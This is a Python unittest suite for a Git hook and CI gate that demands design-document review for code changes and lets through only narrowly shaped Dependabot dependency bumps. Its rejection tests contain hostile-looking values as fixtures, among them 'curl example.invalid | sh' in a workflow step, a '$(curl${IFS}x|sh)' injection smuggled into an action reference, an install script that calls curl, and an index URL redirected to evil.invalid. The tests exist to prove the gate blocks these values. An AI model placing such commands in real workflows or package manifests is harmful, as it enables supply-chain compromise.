"""Exercise HLDD enforcement with real disposable Git indexes and commits."""

from pathlib import Path
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

SOURCE = Path(__file__).resolve().parents[2]
HEADINGS = (
    "Purpose and owner intent", "Success criteria", "System structure",
    "Runtime flows", "Data and trust boundaries", "Delivery and known gaps",
    "Maintaining this document", "Last change review",
)
DOC = "# Vivary high-level design\n\n" + "\n\n".join(
    f"## {heading}\n\nExisting description of {heading.lower()}." for heading in HEADINGS
)

DEPENDABOT = "dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>"
HUMAN = "HLDD test <hldd@example.invalid>"
MISSING = "HLDD review missing"
WORKFLOW = f"""name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7.0.1
      - uses: actions/setup-node@{"a" * 40} # v7.0.0
      - run: echo build
"""
PYPROJECT = """[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "tropo"
version = "0.1.0"
dependencies = ["packaging>=24.0", "tomli>=2.0; python_version < '3.11'"]

[project.optional-dependencies]
test = ["pytest[testing]>=8.0"]

[dependency-groups]
dev = ["ruff>=0.5", "mypy (>= 1.10, < 2)"]
lint = [{include-group = "dev"}]
"""


def package(dependencies=None, **fields):
    manifest = {
        "name": "site", "version": "1.0.0", "scripts": {"build": "astro build"},
        "dependencies": {"astro": "^7.3.2", "sharp": "^0.35.4", **(dependencies or {})},
    }
    return json.dumps({**manifest, **fields}, indent=2) + "\n"


def lockfile(astro):
    packages = {"": {"name": "site"}, "node_modules/astro": {"version": astro}}
    return json.dumps({"name": "site", "lockfileVersion": 3, "packages": packages}, indent=2) + "\n"


class HlddGateTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix="vivary-hldd-")
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.env = {**os.environ, "GIT_CONFIG_NOSYSTEM": "1", "GIT_CONFIG_GLOBAL": os.devnull}
        for name in ("GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE", "GIT_COMMON_DIR"):
            self.env.pop(name, None)
        self.git("init", "-q")
        self.git("config", "user.name", "HLDD test")
        self.git("config", "user.email", "hldd@example.invalid")
        self.git("config", "commit.gpgsign", "false")
        for filename in ("check_hldd.py", "pre-commit-hldd.sh"):
            self.write("scripts/" + filename, (SOURCE / "scripts" / filename).read_text())
        self.write("docs/ARCHITECTURE.md", "# Original CLI design\n")
        self.write("packages/example/app.py", "value = 0\n")
        self.git("add", "docs/ARCHITECTURE.md", "packages/example/app.py")
        self.git("commit", "-qm", "legacy baseline")
        self.legacy = self.git("rev-parse", "HEAD").stdout.strip()
        self.write("packages/example/app.py", "value = 1\n")
        self.git("add", "packages/example/app.py")
        self.git("commit", "-qm", "historical source change before gate adoption")
        self.write("docs/ARCHITECTURE.md", DOC)
        self.git("add", ".")
        self.git("commit", "-qm", "initial")
        self.base = self.git("rev-parse", "HEAD").stdout.strip()

    def run_command(self, *args):
        return subprocess.run(args, cwd=self.root, env=self.env, capture_output=True, text=True)

    def git(self, *args):
        result = self.run_command("git", *args)
        self.assertEqual(result.returncode, 0, result.stderr)
        return result

    def gate(self, *args, success=True):
        result = self.run_command(sys.executable, "scripts/check_hldd.py", *args)
        self.assertEqual(result.returncode == 0, success, result.stdout + result.stderr)
        return result

    def reject(self, *args, failure=MISSING):
        # A crash also exits nonzero, so a rejection must name its reason.
        self.assertIn(failure, self.gate(*args, success=False).stderr)

    def write(self, path, text):
        target = self.root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text, encoding="utf-8", newline="\n")

    def stage_code(self):
        self.write("packages/example/app.py", "value = 2\n")
        self.git("add", "packages/example/app.py")

    def test_code_requires_staged_design_review(self):
        self.stage_code()
        self.gate("--staged", success=False)
        self.write("docs/ARCHITECTURE.md", DOC + "\nThe app now uses value two.\n")
        self.gate("--staged", success=False)
        self.git("add", "docs/ARCHITECTURE.md")
        self.gate("--staged")

    def test_whitespace_comments_and_date_only_changes_do_not_count(self):
        self.stage_code()
        self.write("docs/ARCHITECTURE.md", DOC + "\n\n2026-09-25\n<!-- reviewed -->\n")
        self.git("add", "docs/ARCHITECTURE.md")
        self.gate("--staged", success=False)

    def test_markdown_wrappers_do_not_make_date_only_reviews_substantive(self):
        self.stage_code()
        for update in ("- 2026-09-25", "**2026-09-25**", "_2026-09-25_", "`2026-09-25`", "> 2026-09-25"):
            with self.subTest(update=update):
                self.write("docs/ARCHITECTURE.md", DOC + "\n" + update + "\n")
                self.git("add", "docs/ARCHITECTURE.md")
                self.gate("--staged", success=False)
        self.git("commit", "-qm", "date-only review bypassing local hook")
        self.gate("--base", self.base, success=False)

    def test_required_headings_in_comments_or_fences_do_not_count(self):
        section = "## Data and trust boundaries\n\nExisting description of data and trust boundaries."
        for opening, closing in (("<!--", "-->"), ("```markdown", "```"), ("~~~markdown", "~~~")):
            with self.subTest(opening=opening):
                replacement = opening + "\n" + section + "\n" + closing
                self.write("docs/ARCHITECTURE.md", DOC.replace(section, replacement))
                self.git("add", "docs/ARCHITECTURE.md")
                self.gate("--staged", success=False)

    def test_test_only_change_does_not_require_design_churn(self):
        self.write("packages/example/tests/test_app.py", "assert True\n")
        self.git("add", "packages/example/tests/test_app.py")
        self.gate("--staged")

    def test_missing_required_section_is_rejected(self):
        self.write("docs/ARCHITECTURE.md", DOC.replace("## Data and trust boundaries", "## Notes"))
        self.git("add", "docs/ARCHITECTURE.md")
        self.gate("--staged", success=False)

    def test_deleting_source_requires_review(self):
        self.git("rm", "packages/example/app.py")
        self.gate("--staged", success=False)

    def test_ci_catches_undocumented_later_commit_after_documented_change(self):
        self.stage_code()
        self.write("docs/ARCHITECTURE.md", DOC + "\nThe app now uses value two.\n")
        self.git("add", "docs/ARCHITECTURE.md")
        self.git("commit", "-qm", "documented change")
        self.gate("--base", self.base, "--head", "HEAD")
        self.write("packages/example/app.py", "value = 3\n")
        self.git("add", "packages/example/app.py")
        self.git("commit", "-qm", "undocumented follow-up")
        self.gate("--base", self.base, "--head", "HEAD", success=False)

    def test_invalid_base_fails_instead_of_skipping(self):
        self.gate("--base", "missing-ref", success=False)

    def test_hook_install_is_idempotent_and_preserves_entire_hook(self):
        hooks = self.root / ".git/hooks"
        sentinel = hooks / "commit-msg"
        sentinel.write_bytes(b"#!/bin/sh\n# existing Entire hook\nexit 0\n")
        self.gate("--install-hook")
        original = (hooks / "pre-commit").read_bytes()
        self.gate("--install-hook")
        self.assertEqual(original, (hooks / "pre-commit").read_bytes())
        self.assertEqual(sentinel.read_bytes(), b"#!/bin/sh\n# existing Entire hook\nexit 0\n")
        self.stage_code()
        result = self.run_command("git", "commit", "-qm", "must fail")
        self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn("HLDD review missing", result.stderr)
        self.write("docs/ARCHITECTURE.md", DOC + "\nThe app now uses value two.\n")
        self.git("add", "docs/ARCHITECTURE.md")
        self.git("commit", "-qm", "documented change")
        self.gate("--base", self.base)

    def test_historical_commits_before_gate_adoption_remain_promotable(self):
        self.gate("--base", self.legacy)

    def test_ci_inspects_commits_merged_from_a_side_branch(self):
        self.git("switch", "-qc", "side")
        self.stage_code()
        self.git("commit", "-qm", "undocumented side change")
        self.write("docs/ARCHITECTURE.md", DOC + "\nThe app now uses value two.\n")
        self.git("add", "docs/ARCHITECTURE.md")
        self.git("commit", "-qm", "late design update")
        self.git("switch", "-qc", "integration", self.base)
        self.git("merge", "--no-ff", "side", "-m", "merge side branch")
        self.gate("--base", self.base, success=False)

    def test_site_tools_and_root_documents_require_review(self):
        for filename in ("tools/hoh/workflow.py", "site/astro.config.mjs", "README.md", "SECURITY.md"):
            with self.subTest(filename=filename):
                self.write(filename, "Changed maintained source or contract.\n")
                self.git("add", filename)
                self.gate("--staged", success=False)
                self.git("reset", "-q", "HEAD", "--", filename)

    def test_removing_checker_does_not_disable_ci(self):
        original = (self.root / "scripts/check_hldd.py").read_text()
        self.git("rm", "scripts/check_hldd.py")
        self.write("docs/ARCHITECTURE.md", DOC + "\nAttempted maintenance removal.\n")
        self.git("add", "docs/ARCHITECTURE.md")
        self.git("commit", "-qm", "remove checker")
        self.write("scripts/check_hldd.py", original)
        self.gate("--base", self.base, success=False)

    def test_existing_hook_or_hook_manager_is_not_replaced(self):
        hook = self.root / ".git/hooks/pre-commit"
        hook.write_bytes(b"#!/bin/sh\nexit 42\n")
        self.gate("--install-hook", success=False)
        self.assertEqual(hook.read_bytes(), b"#!/bin/sh\nexit 42\n")
        self.git("config", "core.hooksPath", "custom-hooks")
        self.gate("--install-hook", success=False)
        self.assertFalse((self.root / "custom-hooks").exists())

    def seed(self, files):
        for path, text in files.items():
            self.write(path, text)
        self.write("docs/ARCHITECTURE.md", DOC + "\nThe project pins its dependencies.\n")
        self.git("add", ".")
        self.git("commit", "-qm", "add dependency files")
        return self.git("rev-parse", "HEAD").stdout.strip()

    def commit_as(self, author, files):
        for path, text in files.items():
            self.write(path, text)
        self.git("add", ".")
        self.git("commit", "-qm", "Bump dependencies", f"--author={author}")

    def reject_dependabot(self, base, cases, failure=MISSING):
        for name, files in cases.items():
            with self.subTest(case=name):
                self.commit_as(DEPENDABOT, files)
                self.reject("--base", base, failure=failure)
                self.git("reset", "-q", "--hard", base)

    def dependabot_branch(self, files):
        self.git("switch", "-qc", "dependabot")
        self.commit_as(DEPENDABOT, files)
        self.git("switch", "-q", "-")

    def test_dependabot_package_and_lockfile_bump_passes(self):
        base = self.seed({"site/package.json": package(), "site/package-lock.json": lockfile("7.3.2")})
        self.commit_as(DEPENDABOT, {
            "site/package.json": package(dependencies={"astro": "^7.3.3", "sharp": "~0.35.5"}),
            "site/package-lock.json": lockfile("7.3.3"),
        })
        result = self.gate("--base", base)
        self.assertIn("1 of them dependency-only update(s)", result.stdout)

    def test_dependabot_npm_range_shapes_pass(self):
        base = self.seed({"site/package.json": package()})
        for value in (">=7.3.3 <8", "7.3.2 - 7.3.3", "^7 || ^8", "~7.3", "7.x", "*", "7.3.3-beta.1", "=v7.3.3"):
            with self.subTest(value=value):
                self.commit_as(DEPENDABOT, {"site/package.json": package(dependencies={"astro": value})})
                result = self.gate("--base", base)
                self.assertIn("1 of them dependency-only update(s)", result.stdout)
                self.git("reset", "-q", "--hard", base)

    def test_dependabot_commit_that_edits_the_hldd_is_not_exempt(self):
        base = self.seed({"site/package.json": package()})
        self.commit_as(DEPENDABOT, {
            "site/package.json": package(dependencies={"astro": "^7.3.3"}),
            "docs/ARCHITECTURE.md": DOC + "\nThe site uses astro 7.3.3.\n",
        })
        result = self.gate("--base", base)
        self.assertNotIn("dependency-only", result.stdout)

    def test_dependabot_scalar_type_change_fails(self):
        base = self.seed({"site/package.json": package(private=True)})
        self.reject_dependabot(base, {
            "true to 1": {"site/package.json": package(dependencies={"astro": "^7.3.3"}, private=1)},
        })
        base = self.seed({"packages/tropo/pyproject.toml": PYPROJECT + "\n[tool.setuptools]\ninclude-package-data = false\n"})
        bumped = PYPROJECT.replace("packaging>=24.0", "packaging>=25.0")
        self.reject_dependabot(base, {
            "false to 0": {"packages/tropo/pyproject.toml": bumped + "\n[tool.setuptools]\ninclude-package-data = 0\n"},
        })

    def test_merged_dependabot_pull_request_passes(self):
        base = self.seed({"site/package.json": package(), "site/package-lock.json": lockfile("7.3.2")})
        self.dependabot_branch({
            "site/package.json": package(dependencies={"astro": "^7.3.3"}),
            "site/package-lock.json": lockfile("7.3.3"),
        })
        self.git("merge", "-q", "--no-ff", "dependabot", "-m", "Merge pull request from dependabot")
        result = self.gate("--base", base, "--head", "HEAD")
        self.assertIn("2 introduced commit(s), 2 of them dependency-only update(s)", result.stdout)

    def test_merge_that_changes_a_dependency_file_itself_fails(self):
        base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
        self.dependabot_branch({"site/package-lock.json": lockfile("7.3.3")})
        self.git("merge", "-q", "--no-ff", "--no-commit", "dependabot")
        self.write("site/package-lock.json", lockfile("6.6.6"))
        self.git("add", "site/package-lock.json")
        self.git("commit", "-qm", "evil merge")
        self.reject("--base", base)

    def test_dependabot_workflow_action_bump_passes(self):
        base = self.seed({".github/workflows/ci.yml": WORKFLOW})
        bumped = WORKFLOW.replace("checkout@v7.0.1", "checkout@v7.0.2").replace(
            f"setup-node@{'a' * 40} # v7.0.0", f"setup-node@{'b' * 40} # v7.1.0",
        )
        self.commit_as(DEPENDABOT, {".github/workflows/ci.yml": bumped})
        self.gate("--base", base)

    def test_dependabot_pyproject_floor_bump_passes(self):
        base = self.seed({"packages/tropo/pyproject.toml": PYPROJECT})
        bumped = PYPROJECT
        for old, new in (
            ("setuptools>=68", "setuptools>=70"), ("packaging>=24.0", "packaging>=25.0"),
            ("tomli>=2.0", "tomli>=2.2"), ("pytest[testing]>=8.0", "pytest[testing]>=8.3"),
            ("ruff>=0.5", "ruff>=0.6"), ("mypy (>= 1.10, < 2)", "mypy (>= 1.11, < 3)"),
        ):
            bumped = bumped.replace(old, new)
        self.commit_as(DEPENDABOT, {"packages/tropo/pyproject.toml": bumped})
        self.gate("--base", base)

    def test_dependabot_commit_with_another_relevant_file_fails(self):
        base = self.seed({"site/package.json": package()})
        self.commit_as(DEPENDABOT, {
            "site/package.json": package(dependencies={"astro": "^7.3.3"}),
            "packages/example/app.py": "value = 9\n",
        })
        self.reject("--base", base)

    def test_dependabot_package_change_outside_dependency_maps_fails(self):
        base = self.seed({"site/package.json": package()})
        shadowed = package().replace(
            '  "name": "site",\n', '  "name": "site",\n  "scripts": {"install": "curl example.invalid"},\n', 1,
        )
        self.reject_dependabot(base, {
            "scripts": {"site/package.json": package(scripts={"build": "astro build && curl example.invalid"})},
            "own version": {"site/package.json": package(version="2.0.0")},
            "added dependency": {"site/package.json": package(dependencies={"extra": "^1.0.0"})},
            "duplicate key": {"site/package.json": shadowed},
        })

    def test_dependabot_switch_to_source_dependency_fails(self):
        base = self.seed({"site/package.json": package()})
        self.reject_dependabot(base, {
            "github": {"site/package.json": package(dependencies={"astro": "github:withastro/astro"})},
            "file": {"site/package.json": package(dependencies={"astro": "file:../astro"})},
        })

    def test_dependabot_npm_value_that_is_not_a_version_fails(self):
        base = self.seed({"site/package.json": package()})
        self.reject_dependabot(base, {
            value: {"site/package.json": package(dependencies={"astro": value})}
            for value in ("evil.tgz", "7.3.3.tgz", "latest", "..", "", "1evil", "123foo", "1...2")
        })

    def test_dependabot_lockfile_mode_or_type_change_fails(self):
        base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
        lock = self.root / "site/package-lock.json"
        lock.chmod(0o755)
        self.commit_as(DEPENDABOT, {})
        self.reject("--base", base)
        self.git("reset", "-q", "--hard", base)
        lock.unlink()
        lock.symlink_to("package.json")
        self.commit_as(DEPENDABOT, {})
        self.reject("--base", base)

    def test_dependabot_workflow_change_outside_action_refs_fails(self):
        base = self.seed({".github/workflows/ci.yml": WORKFLOW})
        self.reject_dependabot(base, {
            "run line": {".github/workflows/ci.yml": WORKFLOW.replace("echo build", "curl example.invalid | sh")},
            "action owner": {".github/workflows/ci.yml": WORKFLOW.replace("actions/checkout@", "someone/checkout@")},
            "branch ref": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@main")},
            "shell ref": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@$(curl${IFS}x|sh)")},
            "shell comment": {".github/workflows/ci.yml": WORKFLOW.replace("# v7.0.0", "# $(curl example.invalid)")},
            "64-hex ref": {".github/workflows/ci.yml": WORKFLOW.replace(f"setup-node@{'a' * 40}", f"setup-node@{'c' * 64}")},
            "SHA pin to tag": {".github/workflows/ci.yml": WORKFLOW.replace(f"setup-node@{'a' * 40} # v7.0.0", "setup-node@v7")},
            **{
                f"digit-led ref {ref}": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", f"checkout@{ref}")}
                for ref in ("1evil", "v1evil", "123main", "1...2", "v7.0.1.2")
            },
        })

    def test_dependabot_pyproject_marker_or_name_change_fails(self):
        base = self.seed({"packages/tropo/pyproject.toml": PYPROJECT})
        self.reject_dependabot(base, {
            "marker": {"packages/tropo/pyproject.toml": PYPROJECT.replace("< '3.11'", "< '3.13'")},
            "name": {"packages/tropo/pyproject.toml": PYPROJECT.replace("packaging>=24.0", "packager>=24.0")},
            "direct URL": {"packages/tropo/pyproject.toml": PYPROJECT.replace(
                "packaging>=24.0", "packaging @ https://example.invalid/packaging.whl",
            )},
            "trailing option": {"packages/tropo/pyproject.toml": PYPROJECT.replace(
                "packaging>=24.0", "packaging>=25.0 --index-url https://evil.invalid",
            )},
        })

    def test_exempt_commit_that_guts_the_hldd_fails(self):
        base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
        document = (self.root / "docs/ARCHITECTURE.md").read_text()
        gutted = {"docs/ARCHITECTURE.md": "# Gutted\n"}
        self.commit_as(DEPENDABOT, {"site/package-lock.json": lockfile("7.3.3"), **gutted})
        self.commit_as(HUMAN, {"docs/ARCHITECTURE.md": document})
        self.reject("--base", base, failure="HLDD needs a nonempty")
        self.git("reset", "-q", "--hard", base)
        self.dependabot_branch({"site/package-lock.json": lockfile("7.3.3")})
        self.git("merge", "-q", "--no-ff", "--no-commit", "dependabot")
        self.commit_as(HUMAN, gutted)
        self.commit_as(HUMAN, {"docs/ARCHITECTURE.md": document})
        self.reject("--base", base, failure="HLDD needs a nonempty")

    def test_human_lockfile_only_commit_fails(self):
        base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
        self.commit_as(HUMAN, {"site/package-lock.json": lockfile("7.3.3")})
        self.reject("--base", base)

    def test_staged_lockfile_only_change_is_never_exempt(self):
        self.seed({"site/package-lock.json": lockfile("7.3.2")})
        self.write("site/package-lock.json", lockfile("7.3.3"))
        self.git("add", "site/package-lock.json")
        self.reject("--staged")

    def test_success_output_counts_dependabot_updates(self):
        base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
        self.stage_code()
        self.write("docs/ARCHITECTURE.md", DOC + "\nThe app now uses value two.\n")
        self.git("add", "docs/ARCHITECTURE.md")
        self.git("commit", "-qm", "documented change")
        self.assertEqual(self.gate("--base", base).stdout, "HLDD review passed for 1 introduced commit(s).\n")
        self.commit_as(DEPENDABOT, {"site/package-lock.json": lockfile("7.3.3")})
        self.assertEqual(
            self.gate("--base", base).stdout,
            "HLDD review passed for 2 introduced commit(s), 1 of them dependency-only update(s).\n",
        )

    def test_merge_restoring_an_ancestor_workflow_fails(self):
        seed = self.seed({".github/workflows/ci.yml": WORKFLOW})
        self.commit_as(DEPENDABOT, {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@v7.0.2")})
        base = self.git("rev-parse", "HEAD").stdout.strip()
        merge = self.git("commit-tree", f"{seed}^{{tree}}", "-p", base, "-p", seed, "-m", "merge ancestor").stdout
        self.git("reset", "-q", "--hard", merge.strip())
        self.reject("--base", base)

    def test_merge_restoring_a_stale_side_copy_fails(self):
        self.seed({"site/package.json": package()})
        self.git("switch", "-qc", "side")
        self.commit_as(HUMAN, {"packages/example/tests/test_app.py": "assert True\n"})
        self.git("switch", "-q", "-")
        self.commit_as(DEPENDABOT, {"site/package.json": package(dependencies={"astro": "^7.3.3"})})
        base = self.git("rev-parse", "HEAD").stdout.strip()
        self.git("merge", "-q", "--no-ff", "--no-commit", "side")
        self.git("checkout", "side", "--", "site/package.json")
        self.git("commit", "-qm", "merge side branch")
        self.reject("--base", base)

    def test_merge_carrying_a_change_from_before_gate_adoption_fails(self):
        self.git("switch", "-qc", "pre-gate", self.legacy)
        self.commit_as(HUMAN, {".github/workflows/ci.yml": WORKFLOW})
        self.git("switch", "-qc", "unchecked")
        self.commit_as(HUMAN, {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@v7.0.2")})
        self.git("switch", "-qc", "gated", self.base)
        self.git("merge", "-q", "--no-ff", "pre-gate", "-m", "adopt the pre-gate workflow")
        base = self.git("rev-parse", "HEAD").stdout.strip()
        self.git("merge", "-q", "--no-ff", "unchecked", "-m", "merge unchecked branch")
        self.reject("--base", base)

    def test_dependabot_branch_updated_from_dev_passes(self):
        self.seed({"site/package.json": package(), "site/package-lock.json": lockfile("7.3.2")})
        self.dependabot_branch({
            "site/package.json": package(dependencies={"astro": "^7.3.3"}),
            "site/package-lock.json": lockfile("7.3.3"),
        })
        self.stage_code()
        self.write("docs/ARCHITECTURE.md", DOC + "\nThe app now uses value two.\n")
        self.git("add", "docs/ARCHITECTURE.md")
        self.git("commit", "-qm", "documented change")
        dev = self.git("rev-parse", "HEAD").stdout.strip()
        self.git("switch", "-q", "dependabot")
        self.git("merge", "-q", "--no-ff", dev, "-m", "Merge branch dev into dependabot")
        self.git("switch", "-q", "-")
        self.git("merge", "-q", "--no-ff", "dependabot", "-m", "Merge pull request from dependabot")
        result = self.gate("--base", dev)
        self.assertIn("3 introduced commit(s), 2 of them dependency-only update(s)", result.stdout)

    def test_security_update_brought_from_main_into_dev_passes(self):
        seed = self.seed({"site/package.json": package(), "site/package-lock.json": lockfile("7.3.2")})
        self.git("switch", "-qC", "main", seed)
        self.git("switch", "-qc", "dev")
        self.stage_code()
        self.write("docs/ARCHITECTURE.md", DOC + "\nThe app now uses value two.\n")
        self.git("add", "docs/ARCHITECTURE.md")
        self.git("commit", "-qm", "documented dev change")
        dev = self.git("rev-parse", "HEAD").stdout.strip()
        self.git("switch", "-q", "main")
        self.dependabot_branch({
            "site/package.json": package(dependencies={"astro": "^7.3.3"}),
            "site/package-lock.json": lockfile("7.3.3"),
        })
        self.git("merge", "-q", "--no-ff", "dependabot", "-m", "Merge security update")
        self.git("switch", "-q", "dev")
        self.git("merge", "-q", "--no-ff", "main", "-m", "Merge main into dev")
        pushed = self.gate("--base", dev).stdout
        self.assertIn("3 introduced commit(s), 3 of them dependency-only update(s)", pushed)
        promoted = self.gate("--base", "main", "--head", "dev").stdout
        self.assertIn("2 introduced commit(s), 1 of them dependency-only update(s)", promoted)

    def test_criss_cross_dependency_merge_passes(self):
        clock = iter(range(1_800_000_000, 1_800_100_000, 60))

        def tick():
            moment = f"@{next(clock)} +0000"
            self.env.update(GIT_AUTHOR_DATE=moment, GIT_COMMITTER_DATE=moment)

        self.seed({"site/package.json": package(), "site/package-lock.json": lockfile("7.3.2")})
        self.git("switch", "-qC", "main")
        self.git("branch", "dev")
        tick()
        self.dependabot_branch({
            "site/package.json": package(dependencies={"astro": "^7.3.3"}),
            "site/package-lock.json": lockfile("7.3.3"),
        })
        tick()
        self.git("merge", "-q", "--no-ff", "dependabot", "-m", "Merge security update")
        self.git("switch", "-q", "dev")
        tick()
        self.stage_code()
        self.write("docs/ARCHITECTURE.md", DOC + "\nThe app now uses value two.\n")
        self.git("add", "docs/ARCHITECTURE.md")
        self.git("commit", "-qm", "documented dev change")
        dev_change = self.git("rev-parse", "HEAD").stdout.strip()
        tick()
        self.git("merge", "-q", "--no-ff", "main", "-m", "Merge main into dev")
        base = self.git("rev-parse", "HEAD").stdout.strip()
        self.git("switch", "-q", "main")
        tick()
        self.git("merge", "-q", "--no-ff", dev_change, "-m", "Promote dev change")
        self.git("switch", "-qc", "dependabot-2")
        tick()
        self.commit_as(DEPENDABOT, {
            "site/package.json": package(dependencies={"astro": "^7.3.4"}),
            "site/package-lock.json": lockfile("7.3.4"),
        })
        self.git("switch", "-q", "main")
        tick()
        self.git("merge", "-q", "--no-ff", "dependabot-2", "-m", "Merge second update")
        self.git("switch", "-q", "dev")
        tick()
        self.git("merge", "-q", "--no-ff", "main", "-m", "Merge main into dev again")
        result = self.gate("--base", base)
        self.assertIn("4 introduced commit(s), 3 of them dependency-only update(s)", result.stdout)

    def test_dependabot_package_too_deep_to_parse_fails(self):
        base = self.seed({"site/package.json": package()})
        deep = "[" * 100000 + "]" * 100000
        self.commit_as(DEPENDABOT, {"site/package.json": package().replace('"version"', f'"deep": {deep},\n  "version"', 1)})
        self.reject("--base", base)


if __name__ == "__main__":
    unittest.main()
